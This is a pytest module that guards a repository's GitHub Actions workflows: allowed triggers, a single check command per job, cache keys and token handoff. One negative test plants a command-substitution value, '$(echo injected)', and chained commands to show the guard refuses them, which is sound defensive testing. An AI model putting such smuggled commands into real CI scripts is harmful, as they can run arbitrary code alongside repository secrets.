"""The repository's workflows are a thin edge over Asymptote: each starts only on its allowed triggers and checks through one `asymptote check` call."""

from __future__ import annotations

import ast
import functools
import json
import os
import re
import subprocess
import tomllib
from copy import deepcopy
from pathlib import Path

import pytest
import yaml

from ci.tag.use_case import PRODUCTS

ROOT = Path(__file__).resolve().parents[1]


def named(path: str, inputs: list[str]) -> bool:
    """Whether an input, written from the repository's top, is the path or a directory above it (an empty input is the whole
    tree). An input with a capture or a wildcard names nothing here: the guard holds the literal inputs alone to every path, so
    it needs no copy of asymptote's expansion or matching."""
    literal = [each for each in inputs if not any(character in each for character in "{*?[")]
    return any(each == "" or path == each or path.startswith(each + "/") for each in literal)


def from_top(path: Path) -> str | None:
    """`path` written from the repository's top, or none when it lies outside the repository (a tmp_path row's file)."""
    relative = os.path.relpath(os.path.normpath(path.absolute()), ROOT)
    return None if relative == ".." or relative.startswith("../") else Path(relative).as_posix()


def read(path: Path) -> str:
    """The text of a file this module reads: every read of the repository goes through here, and each is refused unless an input
    of the root's ci-tests tool names it, so ci-tests' stamp covers every file its result stands on. A file outside the
    repository (a tmp_path row's) is read as it is."""
    relative = from_top(path)
    if relative is not None:
        if not hasattr(read, "inputs"):
            manifest = tomllib.loads((ROOT / "asymptote.toml").read_text())
            given = next(tool for tool in manifest["tools"] if tool["id"] == "ci-tests")["inputs"]
            read.inputs = ["" if each == "." else each for each in given]  # type: ignore[attr-defined]
        assert named(relative, read.inputs), f"ci-tests reads {relative}, which no input of the root's ci-tests tool names"  # type: ignore[attr-defined]
    return path.read_text()


def listed(directory: Path, pattern: str) -> list[Path]:
    """The entries `pattern` matches beneath `directory`, sorted: each, inside the repository, named by an input of ci-tests, a
    directory through the manifest that makes it a package (a directory with no file of its own is nothing a stamp sees)."""
    found = sorted(directory.glob(pattern))
    # Reading the root's asymptote.toml, itself an input of ci-tests, loads the inputs.
    read(ROOT / "asymptote.toml")
    inputs_of = read.inputs  # type: ignore[attr-defined]
    for each in found:
        relative = from_top(each)
        if relative is not None:
            assert named(relative, inputs_of) or (each.is_dir() and named(relative + "/Cargo.toml", inputs_of)), (
                f"ci-tests lists {relative}, which no input of the root's ci-tests tool names"
            )
    return found


DIRECTORY = ROOT / ".github/workflows"
WORKFLOWS = listed(DIRECTORY, "*.yml")

# The one command a job's checks are, with the product root and the groups it names: Asymptote decides what runs.
CHECK = re.compile(r"asymptote check( --root [\w./-]+)?( --groups [a-z][a-z-]*(,[a-z][a-z-]*)*)?")
# Evidence capture keeps one check's stdout, stderr and exact exit status. This is deliberately a whole-script grammar, not
# permission to run arbitrary shell commands around a check.
CAPTURE_GROUP = re.compile(r"asymptote check --groups ([a-z][a-z-]*) --format json > target/checks/\1\.json 2> target/checks/\1\.stderr")
# The release itself: a job that does not check runs one job command (`ci/<job>/command.py`) with plain arguments, which no shell
# chains anything to, or only actions (a build matrix). The values it is handed are crates.io's token, from its trusted publishing,
# and the token `gh` creates the GitHub Release with; npm and PyPI exchange the OIDC token themselves.
COMMAND = re.compile(r"uv run ci/[a-z_]+/command\.py( [\w./=-]+)*")
HANDED = {"CARGO_REGISTRY_TOKEN", "GH_TOKEN"}
# What may start a workflow: a hand run, and a pull request to main for the workflows `REQUESTED` names, the check alone (GitHub's
# standard hosted runners are free on a public repository). The workflows `PUSHED` names may start on a push to main too, which
# only a merged pull request makes: the check, whose run on main saves the stores a pull request restores;
# `pull_request_target`, which runs a fork's code with the repository's secrets, never. A schedule starts only the workflows
# `SCHEDULED` names: none. The release starts on the completion of the check's run on main (`WORKFLOW_RUN`), not on a push: its jobs
# run only when that run's `gate` passed. A workflow that publishes starts only by hand or on a completed check on main.
ALLOWED = {"workflow_dispatch", "pull_request"}
REQUESTED = {"check.yml"}
# The events of a pull request that start the check: GitHub's default three, and `edited`, so a pull request whose title changes
# after a green run is checked again (the title is read from the event, which no stored result holds).
PULL_REQUEST = {"branches": ["main"], "types": ["opened", "synchronize", "reopened", "edited"]}
PUSHED = {"check.yml"}
RELEASED = {"release.yml"}
WORKFLOW_RUN = {"workflows": ["check"], "types": ["completed"], "branches": ["main"]}
SCHEDULED: set[str] = set()
# What may follow a job's check: uploading what its tools left (a bench's documents) as the run's artifact, and saving the job's
# asymptote store.
UPLOAD = "actions/upload-artifact@"
# A job's asymptote store: the root's or a product's `.asymptote/cache`, restored before its check and saved after it, a failed
# one too, under a key of its machine, product and group and of the files that pin the installed tools (`TOOLHASH`), so a tool's
# new version opens an empty store; the run and attempt end the key, and a run restores the newest entry of the same prefix.
RESTORE = "actions/cache/restore@"
SAVE = "actions/cache/save@"
STORE = re.compile(r"(crates/[\w.$/{} -]+/)?\.asymptote/cache")
TOOLHASH = (
    "${{ hashFiles('tools/install.py', 'crates/*/Cargo.toml', 'tools/lints/Cargo.toml', 'tastemaker.toml', 'asymptote.toml', "
    "'.github/workflows/check.yml', 'ci/scripts/**', 'rust-toolchain.toml') }}"
)
# The check matrix's groups whose answer stands on state outside the repository, which no stamp holds: release-resolution resolves
# against crates.io's live index, api's semver baseline is the newest release tag. Their rows keep no store, nor does speed, whose
# answer stands on origin/main.
UNSTORED_GROUPS = ("release-resolution", "api")
# A row of the check matrix says whether it keeps a store (`store`), and the groups above are the rows that say no.
UNSTORED = "matrix.check.store"
# Every cache is saved by a run on main alone and restored by every run, so a pull request reads what main saved.
MAIN = "github.ref == 'refs/heads/main'"
# The toolchains a stored pass is replayed under: each pinned to its exact version in check.yml, which the key hashes.
PINNED = {"actions/setup-node": "node-version", "actions/setup-python": "python-version", "astral-sh/setup-uv": "version", "actions/setup-go": "go-version"}
STORE_KEY = re.compile(
    r"asymptote-\$\{\{ runner\.os \}\}-\$\{\{ runner\.arch \}\}-(?P<product>root|\$\{\{ matrix\.product \}\}|"
    + "|".join(PRODUCTS)
    + r")-(?P<group>[a-z][a-z-]*|\$\{\{ matrix\.check\.label \}\})-"
    + re.escape(TOOLHASH)
    + r"-\$\{\{ github\.run_id \}\}-\$\{\{ github\.run_attempt \}\}"
)
# The GitHub Release is the one step beside the job command that is not a command of its own: `gh` calls and the checksums they upload.
RELEASE_STEP = "GitHub Release"
# One release per product, over the directories of `dist/archives`, each named for its product's tag.
RELEASE_LINE = re.compile(
    r"for archives in dist/archives/\*/; do|done"
    r"|\s*(tag=\"\$\(basename \"\$archives\"\)\"|\(cd \"\$archives\" && sha256sum -- \* > SHA256SUMS\)|gh release (create|upload|edit) .*)"
)
# The steps that put the declared tools on a machine; a job command runs beside them and installs nothing itself.
SETUP = {"rustup toolchain install", "uv run --script tools/install.py"}

# The bench-correctness job verifies every default of every linter bench, each case under its own rule's settings profile, in
# one job on one Linux runner, its one asymptote group. Its guards keep a failure from turning into a pass: no skip, no masked
# step, exactly its one check, its environment, and receipts uploaded even after failure.
BENCH_CORRECTNESS_GROUP = "bench-correctness"
BENCH_CORRECTNESS_CHECK = f"asymptote check --root crates/ryo --groups {BENCH_CORRECTNESS_GROUP}"
BENCH_CORRECTNESS_ENV = {"RAYON_NUM_THREADS": "1", "CARGO_BUILD_JOBS": "6"}
BENCH_CORRECTNESS_UPLOAD = {
    "name": "bench-correctness-${{ github.run_attempt }}",
    "path": "target/benchmark/",
    "include-hidden-files": True,
    "if-no-files-found": "error",
    "retention-days": 7,
}


def bench_correctness_problems(job: dict) -> list[str]:
    """What lets the bench-correctness job pass without verifying every bench in each of its groups."""
    found = []
    steps = job.get("steps", [])
    if job.get("runs-on") != "ubuntu-26.04" or "container" in job:
        found.append("bench-correctness must run on the one Linux runner, outside a container")
    if "strategy" in job:
        found.append("bench-correctness runs its one group; a matrix would add groups the gate does not review")
    if not isinstance(job.get("timeout-minutes"), int) or job["timeout-minutes"] <= 360:
        found.append("bench-correctness needs headroom over its tool's 360-minute timeout")
    if "if" in job or "continue-on-error" in job:
        found.append("bench-correctness may not be skipped or masked")
    if job.get("env") != BENCH_CORRECTNESS_ENV:
        found.append("bench-correctness changed its pinned environment")
    runs = [step.get("run") for step in steps if "run" in step]
    if runs.count(BENCH_CORRECTNESS_CHECK) != 1:
        found.append("bench-correctness does not run exactly its one check")
    if any("continue-on-error" in step or "shell" in step for step in steps):
        found.append("bench-correctness steps may not mask failures or override their shell")
    if any(
        "if" in step and (step.get("name"), step["if"])
        not in {
            ("Save the installed tools", f"{MAIN} && steps.cargo_bin_cache.outputs.cache-hit != 'true'"),
            ("Bench summaries and per-rule receipts", "always()"),
        }
        for step in steps
    ):
        found.append("bench-correctness has an unreviewed step condition")
    upload = steps[-1] if steps else {}
    if not upload.get("uses", "").startswith(UPLOAD) or upload.get("if") != "always()" or upload.get("with") != BENCH_CORRECTNESS_UPLOAD:
        found.append("bench-correctness must upload its complete receipts even after failure")
    return found


def store_steps(job: dict) -> list[tuple[int, dict]]:
    """The job's steps that restore or save an asymptote store, with their positions."""
    return [
        (index, step)
        for index, step in enumerate(job.get("steps", []))
        if step.get("uses", "").startswith(("actions/cache@", RESTORE, SAVE)) and ".asymptote" in str(step.get("with", {}).get("path", ""))
    ]


def store_problems(name: str, job: dict) -> list[str]:
    """What keeps a job's asymptote store from being one store, restored before its check and saved after it even when it fails:
    a store step that is not a restore or a save of `.asymptote/cache`, a save before the check or not under `if: always()`, a key
    not of `STORE_KEY`'s shape, a restore whose key or restore keys differ from its save's, and a store kept with no check."""
    found = []
    stored = store_steps(job)
    if not stored:
        return found
    positions = checks(job)
    if len(positions) != 1:
        return [f"{name} keeps an asymptote store with no one check"]
    restores = [(index, step) for index, step in stored if step["uses"].startswith(RESTORE)]
    saves = [(index, step) for index, step in stored if step["uses"].startswith(SAVE)]
    if len(restores) != 1 or len(saves) != 1 or len(stored) != 2:
        return [f"{name} must restore its asymptote store once and save it once"]
    (restore_at, restore), (save_at, save) = restores[0], saves[0]
    if not restore_at < positions[0] < save_at:
        found.append(f"{name} must restore its asymptote store before its check and save it after")
    # The check matrix leaves its unstored groups out of both steps, and no other condition is reviewed.
    unstored = name == "check" and restore.get("if") == UNSTORED
    if restore.get("if") not in (None, UNSTORED) or (restore.get("if") == UNSTORED and name != "check"):
        found.append(f"{name} restores its asymptote store under an unreviewed condition")
    if save.get("if") != (f"always() && {MAIN} && {UNSTORED}" if unstored else f"always() && {MAIN}"):
        found.append(f"{name} must save its asymptote store after a failed check too, exactly where it restores one")
    path, key = save["with"].get("path", ""), save["with"].get("key", "")
    if not STORE.fullmatch(path) or not STORE_KEY.fullmatch(key):
        found.append(f"{name} saves {path!r} under {key!r}, not its asymptote store under its machine, product, group and tool pins")
    prefix = key.split("${{ github.run_id }}")[0]
    if restore["with"] != {"path": path, "key": key, "restore-keys": prefix + "\n"}:
        found.append(f"{name} restores a store other than the one it saves, or not the newest of its prefix")
    return found


def triggers(workflow: dict) -> set[str]:
    """What starts the workflow. YAML 1.1, which PyYAML reads, takes the key `on` for true."""
    return set(workflow["on" if "on" in workflow else True])


def environment(job: dict) -> str | None:
    """The environment a job runs in, named alone or as `name:`."""
    named = job.get("environment")
    return named.get("name") if isinstance(named, dict) else named


def trigger_problems(name: str, workflow: dict) -> list[str]:
    """What starts the workflow that may not: a trigger outside `ALLOWED` (a schedule outside `SCHEDULED`), a push for any
    workflow `PUSHED` does not name and a push to a branch other than main for one it does, a pull request for any workflow
    `REQUESTED` does not name and a pull request to a branch other than main for one it does, and anything but a hand run or a push
    to main for a workflow that publishes (a `publish` job, or a job in the `release` environment)."""
    started = triggers(workflow)
    pushed = name in PUSHED
    allowed = ALLOWED | ({"schedule"} if name in SCHEDULED else set())
    extra = ({"push"} if pushed else set()) | ({"workflow_run"} if name in RELEASED else set())
    found = [f"{name} starts on {each}" for each in sorted(started - allowed - extra)]
    on = workflow["on" if "on" in workflow else True]
    if pushed and "push" in started and (on.get("push") if isinstance(on, dict) else None) != {"branches": ["main"]}:
        found.append(f"{name} starts on a push to more than main")
    if name in RELEASED and "workflow_run" in started and (on.get("workflow_run") if isinstance(on, dict) else None) != WORKFLOW_RUN:
        found.append(f"{name} must start on the completion of the check on main alone")
    if "pull_request" in started and name not in REQUESTED:
        found.append(f"{name} starts on pull_request")
    elif "pull_request" in started:
        given = (on.get("pull_request") if isinstance(on, dict) else None) or {}
        if given.get("branches") != ["main"]:
            found.append(f"{name} starts on a pull request to more than main")
        elif given != PULL_REQUEST:
            found.append(f"{name} must start on {PULL_REQUEST['types']} of a pull request, an edited title among them")
    jobs = workflow["jobs"]
    if ("publish" in jobs or any(environment(job) == "release" for job in jobs.values())) and started - {"workflow_dispatch", "workflow_run"}:
        found.append(f"{name} publishes, so it starts only by hand or on a completed check on main")
    return found


def checks(job: dict) -> list[int]:
    """The positions of the job's steps that call `asymptote check`."""
    return [index for index, step in enumerate(job["steps"]) if re.search(r"(^|\s)asymptote check\b", step.get("run", ""))]


def needs(job: dict) -> list[str]:
    """The jobs this job waits for."""
    waits = job.get("needs", [])
    return [waits] if isinstance(waits, str) else list(waits)


def captured_check(run: str) -> bool:
    """Accept only the workflow's evidence wrappers, preserving the check's streams and exit status exactly."""
    lines = run.splitlines()
    if len(lines) == 9 and (matched := CAPTURE_GROUP.fullmatch(lines[2])):
        group = matched[1]
        status = "build_status" if group == "build" else "quality_status"
        stem = f"target/checks/{group}"
        return lines == [
            "mkdir -p target/checks",
            "set +e",
            f"asymptote check --groups {group} --format json > {stem}.json 2> {stem}.stderr",
            f"{status}=$?",
            "set -e",
            f"cat {stem}.json",
            f"cat {stem}.stderr >&2",
            f"printf '%s\\n' \"${status}\" > {stem}.status",
            f'exit "${status}"',
        ]
    return lines == [
        "mkdir -p target/benchmarks/speed",
        "set +e",
        "asymptote check --groups speed --format json > target/benchmarks/speed/check.json 2> target/benchmarks/speed/check.stderr.log",
        "speed_status=$?",
        "cat target/benchmarks/speed/check.json",
        "cat target/benchmarks/speed/check.stderr.log >&2",
        'exit "$speed_status"',
    ]


def problems(workflow: dict) -> list[str]:
    """What keeps the workflow from being a thin edge over `asymptote check`: a job that calls it more than once, anywhere but
    last (but an upload of what its tools left and the save of its asymptote store), or with more than the one command line; a
    job whose asymptote store is not restored before its check and saved after it; a job that does not check and runs more than
    one job command; a job neither checking, nor waiting for one that does, nor deciding what one runs (a job such a job waits
    for); a workflow no job of which checks."""
    jobs = workflow["jobs"]
    found = []
    for name, job in jobs.items():
        if name == "bench-correctness":
            found.extend(bench_correctness_problems(job))
        found.extend(store_problems(name, job))
        positions = checks(job)
        saved = {index for index, step in store_steps(job) if step["uses"].startswith(SAVE)}
        if len(positions) > 1:
            found.append(f"{name} calls asymptote check {len(positions)} times")
        elif positions:
            run = re.sub(r"\$\{\{.*?\}\}", "value", job["steps"][positions[0]]["run"].strip())
            following = enumerate(job["steps"][positions[0] + 1 :], start=positions[0] + 1)
            if any(not step.get("uses", "").startswith(UPLOAD) and index not in saved for index, step in following):
                found.append(f"{name} does not end in its asymptote check step")
            if not CHECK.fullmatch(run) and not captured_check(run):
                found.append(f"{name} runs {run!r}, not one `asymptote check [--root <dir>] [--groups <groups>]`")
        else:
            steps = [step for step in job["steps"] if "run" in step and step.get("name") != RELEASE_STEP]
            runs = [re.sub(r"\$\{\{.*?\}\}", "value", step["run"].strip()) for step in steps]
            runs = [each for each in runs if each not in SETUP]
            if len(runs) > 1 or any(not COMMAND.fullmatch(each) for each in runs):
                found.append(f"{name} does not check and does not run exactly one job command: {runs}")
            for step in job["steps"]:
                if step.get("name") == RELEASE_STEP:
                    found += [f"{name} releases with {line!r}" for line in step["run"].strip().splitlines() if not RELEASE_LINE.fullmatch(line)]
            if any(set(step.get("env", {})) - HANDED for step in job["steps"]):
                found.append(f"{name} hands a step more than {sorted(HANDED)}")

    def gated(name: str, seen: frozenset[str] = frozenset()) -> bool:
        return bool(checks(jobs[name])) or any(gated(each, seen | {name}) for each in needs(jobs[name]) if each not in seen)

    # The jobs a gated job waits for: the ones that decide what it runs (which products a push releases).
    deciding = {each for name in jobs if gated(name) for each in needs(jobs[name])}
    found += [f"{name} neither checks nor waits for a job that does" for name in jobs if not gated(name) and name not in deciding]
    if not any(checks(job) for job in jobs.values()):
        found.append("no job calls asymptote check")
    return found


def job(*run: str, needs: str | None = None) -> dict:
    """A job whose steps run the given commands in order."""
    return {"steps": [{"run": each} for each in run]} | ({"needs": needs} if needs else {})


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_runs_only_on_its_allowed_triggers(path: Path) -> None:
    """A workflow starts only by hand; one that publishes, on a push to main too. The git hook `asymptote init` installs and the
    local gates stay the per-change gate."""
    assert trigger_problems(path.name, yaml.safe_load(read(path))) == []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_checks_through_one_asymptote_call(path: Path) -> None:
    """Beside the steps that set up its machine and install the tools, a job that checks ends in one `asymptote check` call, and
    every other job of the workflow waits for one that does."""
    assert problems(yaml.safe_load(read(path))) == []


def test_speed_job_saves_installed_tools_before_quality_checks() -> None:
    """The independent speed guard retains its installed tools even when quality fails: saved by main alone, under the key every
    job of its machine shares, and restored by every run."""
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    action = "55cc8345863c7cc4c66a329aec7e433d2d1c52a9"
    paths = "~/.cargo/bin\n~/.cargo/.crates.toml\n~/.cargo/.crates2.json\n"
    prefix = "cargo-bin-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('tools/install.py', 'crates/*/Cargo.toml', 'tools/lints/Cargo.toml') }}"
    key = prefix
    for name in ("speed",):
        steps = workflow["jobs"][name]["steps"]
        restore = next(index for index, step in enumerate(steps) if step.get("id") == "cargo_bin_cache")
        install = next(index for index, step in enumerate(steps) if step.get("run") == "uv run --script tools/install.py")
        save = steps[install + 1]
        assert restore < install < len(steps) - 1
        assert steps[restore]["uses"] == f"actions/cache/restore@{action}"
        assert steps[restore]["with"] == {
            "path": paths,
            "key": key,
        }
        assert save["uses"] == f"actions/cache/save@{action}"
        assert save["if"] == f"{MAIN} && steps.cargo_bin_cache.outputs.cache-hit != 'true'"
        assert save["with"] == {"path": paths, "key": key}
        assert any("asymptote check" in step.get("run", "") for step in steps[install + 2 :])


def test_there_are_workflows_to_hold() -> None:
    assert [path.name for path in WORKFLOWS]


def test_a_job_that_installs_and_ends_in_one_check_is_a_thin_edge() -> None:
    workflow = {"jobs": {"check": job("cargo install --path crates/asymptote/cli --locked", "asymptote check --groups lint,perf")}}
    assert problems(workflow) == []


def test_a_job_that_installs_with_the_script_and_ends_in_one_check_is_a_thin_edge() -> None:
    assert problems({"jobs": {"check": job("uv run --script tools/install.py", "asymptote check --groups test")}}) == []


def test_a_job_command_runs_beside_the_steps_that_install_the_tools() -> None:
    publish = job("rustup toolchain install", "uv run --script tools/install.py", "uv run ci/release/command.py --publish", needs="check")
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == []


def test_a_job_that_waits_for_the_checking_job_is_gated_by_it() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py --publish", needs="check")}}
    assert problems(workflow) == []


def test_a_job_that_runs_more_than_its_job_command_is_refused() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("echo", "uv run ci/release/command.py", needs="check")}}
    assert len(problems(workflow)) == 1 and "exactly one job command" in problems(workflow)[0]
    chained = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py && echo", needs="check")}}
    assert len(problems(chained)) == 1


def test_a_step_handed_more_than_the_tokens_is_refused() -> None:
    publish = job("uv run ci/release/command.py", needs="check")
    publish["steps"][0]["env"] = {"CARGO_REGISTRY_TOKEN": "x", "OTHER": "y"}
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
        "publish hands a step more than ['CARGO_REGISTRY_TOKEN', 'GH_TOKEN']"
    ]


def test_a_job_that_does_not_end_in_its_check_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check", "echo done")}}) == ["check does not end in its asymptote check step"]


def test_a_check_may_take_its_group_from_the_matrix_and_upload_what_its_tools_left() -> None:
    # The expression is written in pieces, since the template this file is rendered from reads two braces as its own.
    expression = "$" + "{" * 2 + " matrix.group " + "}" * 2
    checking = job("uv run --script tools/install.py", f"asymptote check --groups {expression}")
    checking["steps"].append({"uses": "actions/upload-artifact@0000000000000000000000000000000000000000", "with": {"path": "target"}})
    assert problems({"jobs": {"check": checking}}) == []


@pytest.mark.parametrize("name", ["check", "speed"])
def test_each_real_check_remains_one_check(name: str) -> None:
    """The product checks and independent speed guard each contain one propagated check."""
    checking = yaml.safe_load(read(DIRECTORY / "check.yml"))["jobs"][name]
    assert problems({"jobs": {name: checking}}) == []


@pytest.mark.parametrize(
    ("before", "after"),
    [
        ("set +e", "set +e\necho extra"),
        ("build_status=$?", "asymptote check --groups lint\nbuild_status=$?"),
        ("build_status=$?", "echo changed-status\nbuild_status=$?"),
        ("build_status=$?", "build_status=0"),
        ('exit "$build_status"', "exit 0"),
        ('exit "$build_status"', 'exit "$other_status"'),
        ("build.stderr", "other.stderr"),
        ("cat target/checks/build.json", "cat target/checks/build.json; echo extra"),
        ("--format json", "--format json --groups lint"),
        ("--format json", "--format json || true"),
        ("mkdir -p target/checks", "mkdir -p target/$(echo injected)"),
    ],
)
def test_capture_refuses_extra_commands_changed_streams_and_masked_status(before: str, after: str) -> None:
    """Finding a check inside a script never authorizes unrelated shell work or a successful exit after a failed check."""
    checking = job("\n".join([
        "mkdir -p target/checks", "set +e",
        "asymptote check --groups build --format json > target/checks/build.json 2> target/checks/build.stderr",
        "build_status=$?", "set -e", "cat target/checks/build.json",
        "cat target/checks/build.stderr >&2", "printf '%s\\n' \"$build_status\" > target/checks/build.status",
        'exit "$build_status"',
    ]))
    assert problems({"jobs": {"build": checking}}) == []
    step = checking["steps"][checks(checking)[0]]
    assert before in step["run"]
    step["run"] = step["run"].replace(before, after)
    assert problems({"jobs": {"build": checking}})


def test_speed_capture_refuses_a_second_check_or_masked_exit() -> None:
    """The shorter speed wrapper has the same one-command and status requirements."""
    workflow = yaml.safe_load(read(DIRECTORY / "check.yml"))
    run = workflow["jobs"]["speed"]["steps"][checks(workflow["jobs"]["speed"])[0]]["run"]
    for changed in (
        run.replace("speed_status=$?", "asymptote check\nspeed_status=$?"),
        run.replace('exit "$speed_status"', "exit 0"),
    ):
        assert problems({"jobs": {"speed": job(changed)}})


def test_a_job_that_checks_twice_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check --groups lint", "asymptote check --groups test")}}) == [
        "check calls asymptote check 2 times"
    ]


def test_a_check_that_chains_another_command_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check && echo done")}}) == [
        "check runs 'asymptote check && echo done', not one `asymptote check [--root <dir>] [--groups <groups>]`"
    ]


def test_a_job_that_neither_checks_nor_waits_for_a_check_is_refused() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py --publish")}}
    assert problems(workflow) == ["publish neither checks nor waits for a job that does"]


def test_a_workflow_that_never_calls_asymptote_is_refused() -> None:
    assert "no job calls asymptote check" in problems({"jobs": {"build": job("uv run ci/release/command.py")}})


def test_a_trigger_other_than_dispatch_is_told_apart() -> None:
    pushed = yaml.safe_load("on:\n  push:\n  workflow_dispatch:\njobs: {}\n")
    dispatched = yaml.safe_load("on:\n  workflow_dispatch:\njobs: {}\n")
    assert triggers(pushed) != {"workflow_dispatch"}
    assert triggers(dispatched) == {"workflow_dispatch"}


def test_a_schedule_starts_only_the_scheduled_workflows() -> None:
    scheduled = yaml.safe_load("on:\n  schedule:\n    - cron: '0 3 * * 0'\n  workflow_dispatch:\njobs: {}\n")
    assert trigger_problems("check.yml", scheduled) == ["check.yml starts on schedule"]
    assert trigger_problems("benchmarks.yml", scheduled) == ["benchmarks.yml starts on schedule"]


def test_a_pull_request_to_main_starts_only_the_check() -> None:
    """The check runs on every pull request to main; no other workflow starts on one, and the check on no other branch's."""
    requested = {"on": {"pull_request": PULL_REQUEST, "workflow_dispatch": None}, "jobs": {}}
    assert trigger_problems("check.yml", requested) == []
    # Planted: without `edited`, renaming a pull request after a green run starts no run, and its title goes unchecked.
    unedited = {"on": {"pull_request": {"branches": ["main"], "types": ["opened", "synchronize", "reopened"]}}, "jobs": {}}
    assert trigger_problems("check.yml", unedited) == [
        "check.yml must start on ['opened', 'synchronize', 'reopened', 'edited'] of a pull request, an edited title among them"
    ]
    defaults = {"on": {"pull_request": {"branches": ["main"]}}, "jobs": {}}
    assert trigger_problems("check.yml", defaults) == trigger_problems("check.yml", unedited)
    assert trigger_problems("release-pr.yml", requested) == ["release-pr.yml starts on pull_request"]
    assert trigger_problems("release.yml", requested | {"on": {"pull_request": {"branches": ["main"]}, "workflow_run": WORKFLOW_RUN}}) == [
        "release.yml starts on pull_request"
    ]
    every = yaml.safe_load("on:\n  pull_request:\n  workflow_dispatch:\njobs: {}\n")
    assert trigger_problems("check.yml", every) == ["check.yml starts on a pull request to more than main"]
    more = yaml.safe_load("on:\n  pull_request:\n    branches: [main, next]\njobs: {}\n")
    assert trigger_problems("check.yml", more) == ["check.yml starts on a pull request to more than main"]
    # The real release workflow, given a pull request, is refused.
    release = yaml.safe_load(read(DIRECTORY / "release.yml"))
    release["on" if "on" in release else True]["pull_request"] = {"branches": ["main"]}
    assert trigger_problems("release.yml", release) == [
        "release.yml starts on pull_request",
        "release.yml publishes, so it starts only by hand or on a completed check on main",
    ]


def test_a_pull_request_target_is_refused() -> None:
    """`pull_request_target` runs a fork's code with the repository's secrets."""
    target = yaml.safe_load("on:\n  pull_request_target:\njobs: {}\n")
    assert trigger_problems("check.yml", target) == ["check.yml starts on pull_request_target"]


def test_a_push_starts_a_workflow_only_on_main() -> None:
    """Only the check, whose run on main seeds the stores a pull request restores, starts on a push, and only on one to main: the
    release starts on that run's completion instead."""
    main = yaml.safe_load("on:\n  push:\n    branches: [main]\njobs: {}\n")
    assert trigger_problems("check.yml", main) == []
    assert trigger_problems("release.yml", main) == ["release.yml starts on push"]
    assert trigger_problems("benchmarks.yml", main) == ["benchmarks.yml starts on push"]
    assert trigger_problems("publish.yml", main) == ["publish.yml starts on push"]
    every = yaml.safe_load("on:\n  push:\njobs: {}\n")
    assert trigger_problems("check.yml", every) == ["check.yml starts on a push to more than main"]
    # The real benchmarks workflow, given a push to main, is refused.
    benchmarks = yaml.safe_load(read(DIRECTORY / "benchmarks.yml"))
    benchmarks["on" if "on" in benchmarks else True]["push"] = {"branches": ["main"]}
    assert trigger_problems("benchmarks.yml", benchmarks) == ["benchmarks.yml starts on push"]


def test_a_workflow_that_publishes_starts_only_by_hand_or_on_a_push_to_main() -> None:
    """A workflow that publishes starts only by hand or on the completion of the check on main (a merged pull request's green run,
    which replaces the push the template names); a pull request's own run never publishes."""
    publish = {"environment": "release", "steps": [{"run": "uv run ci/release/command.py --publish"}]}
    on_a_pull_request = {"on": {"workflow_dispatch": None, "pull_request": None}, "jobs": {"publish": publish}}
    assert trigger_problems("release.yml", on_a_pull_request) == [
        "release.yml starts on pull_request",
        "release.yml publishes, so it starts only by hand or on a completed check on main",
    ]
    # The one workflow a pull request may start publishes nothing either.
    assert trigger_problems("check.yml", on_a_pull_request | {"on": {"pull_request": PULL_REQUEST}}) == [
        "check.yml publishes, so it starts only by hand or on a completed check on main"
    ]
    by_hand = {"on": {"workflow_dispatch": None}, "jobs": {"upload": {"environment": {"name": "release"}, "steps": []}}}
    assert trigger_problems("release.yml", by_hand) == []
    on_a_run = by_hand | {"on": {"workflow_run": WORKFLOW_RUN, "workflow_dispatch": None}}
    assert trigger_problems("release.yml", on_a_run) == []
    # Publishing grants no workflow run: only the release workflow, by name, starts on one.
    assert trigger_problems("publish.yml", on_a_run) == ["publish.yml starts on workflow_run"]
    # A publish on a push, or on any check's completion but the check's on main, is refused.
    on_a_push = by_hand | {"on": {"push": {"branches": ["main"]}}}
    assert trigger_problems("release.yml", on_a_push) == [
        "release.yml starts on push",
        "release.yml publishes, so it starts only by hand or on a completed check on main",
    ]
    on_any_run = by_hand | {"on": {"workflow_run": {**WORKFLOW_RUN, "workflows": ["check", "benchmarks"]}}}
    assert trigger_problems("release.yml", on_any_run) == ["release.yml must start on the completion of the check on main alone"]
    any_branch = by_hand | {"on": {"workflow_run": {"workflows": ["check"], "types": ["completed"]}}}
    assert trigger_problems("release.yml", any_branch) == ["release.yml must start on the completion of the check on main alone"]


def test_a_job_that_decides_what_a_gated_job_runs_is_gated_by_it() -> None:
    """The jobs a gated job waits for, such as the one naming the products a push releases, need not check themselves."""
    tagging = {"jobs": {"tag": job("uv run ci/tag/command.py --push"), "check": job("asymptote check"), "build": job(needs="check")}}
    tagging["jobs"]["build"]["needs"] = ["tag", "check"]
    assert problems(tagging) == []


def test_only_the_release_job_that_uploads_is_handed_a_token_and_only_after_the_maintainer_s_gate() -> None:
    """The registry token reaches the one job that publishes, and only when all three of the gate hold (`PUBLISH`): a dry run
    never holds it."""
    workflow = yaml.safe_load(read(DIRECTORY / "release.yml"))
    handed = {
        name
        for name, defined in workflow["jobs"].items()
        if any("CARGO_REGISTRY_TOKEN" in step.get("env", {}) for step in defined["steps"])
    }
    assert handed == {"publish"}
    publish = workflow["jobs"]["publish"]
    assert publish["environment"] == "release" and "RELEASE_MAINTAINER" in publish["env"]["PUBLISH"]
    # A green check on main publishes the products it tagged; a hand run, one product, only from its own tag.
    assert publish["env"]["PUBLISH"].startswith("${{ github.event_name == 'workflow_run' || (inputs.publish && ")
    assert "startsWith(github.ref_name, format('idiomatic-sh-{0}-v', matrix.product))" in publish["env"]["PUBLISH"]
    (product,) = [workflow["on" if "on" in workflow else True]["workflow_dispatch"]["inputs"]["product"]]
    assert product["required"] is True and product["options"] == ["ryo", "tastemaker", "asymptote"]
